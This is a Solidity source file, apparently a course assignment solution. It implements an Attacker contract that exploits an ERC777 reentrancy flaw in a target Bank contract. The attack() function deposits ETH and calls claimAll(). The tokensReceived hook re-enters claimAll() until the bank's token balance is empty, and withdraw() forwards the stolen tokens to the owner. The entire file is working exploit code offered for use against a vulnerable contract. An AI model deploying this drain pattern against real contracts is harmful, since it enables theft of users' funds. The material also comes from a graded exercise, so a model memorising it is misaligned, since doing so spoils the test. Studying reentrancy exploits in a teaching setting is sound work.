// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title IBank
 * @dev Interface for the vulnerable Bank contract.
 * Based on the assignment description, it must have:
 * - A `deposit()` function to deposit ETH.
 * - A `claimAll()` function which is the vulnerable ERC777 withdrawal function.
 * - A way to get the address of the ERC777 token, assumed to be `token()`.
 */
interface IBank {
    function deposit() external payable;
    function claimAll() external;
    function token() external view returns (IERC20);
}

/**
 * @title Attacker
 * @dev This contract exploits a reentrancy vulnerability in the Bank contract.
 * It implements the functions required by the assignment:
 * - `attack()`: Deposits ETH and starts the reentrancy loop by calling `claimAll()`.
 * - `tokensReceived()`: The ERC777 hook that re-enters the `claimAll()` function.
 */
contract Attacker is IERC777Recipient {
    address public owner;
    IBank public target; // The vulnerable Bank contract
    IERC20 public token; // The ERC777 token from the Bank

    constructor() {
        owner = msg.sender;
    }

    /**
     * @dev Sets the address of the vulnerable Bank contract.
     * This is step 3 from the autograder description.
     */
    function setTarget(address _target) public {
        require(msg.sender == owner, "Only owner can set target");
        target = IBank(_target);
        token = target.token();
    }

    /**
     * @dev Executes the attack.
     * Per the assignment (Image 2, point 2), this function:
     * 1. Calls `deposit()` on the Bank contract (must be called with ETH).
     * 2. Calls the vulnerable `claimAll()` function to initiate the attack.
     * This function must be called with ETH to fund the initial deposit.
     */
    function attack() external payable {
        require(msg.value > 0, "Must send ETH to deposit");

        // 1. Deposit ETH into the bank to get an initial balance
        target.deposit{value: msg.value}();
        
        // 2. Start the reentrancy attack by calling the vulnerable function
        target.claimAll();
    }

    /**
     * @dev ERC777 hook. This function is called by the ERC777 token contract
     * during the transfer in `claimAll()`, *before* the Bank updates its
     * internal balance.
     *
     * This is the core of the reentrancy attack.
     */
    function tokensReceived(
        address operator,
        address from,
        address to,
        uint amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external override {
        // As long as the Bank contract still holds more of its own tokens,
        // we recursively call `claimAll()` to drain it.
        // This check prevents the transaction from reverting due to
        // an infinite loop or running out of gas after the bank is empty.
        if (token.balanceOf(address(target)) > 0) {
            target.claimAll();
        }
    }

    /**
     * @dev Withdraws all stolen ERC777 tokens from this contract
     * to the owner's address.
     * This is step 3 from the `Attacker.sol` description (Image 2).
     */
    function withdraw() public {
        require(msg.sender == owner, "Only owner can withdraw");
        uint256 balance = token.balanceOf(address(this));
        token.transfer(owner, balance);
    }
}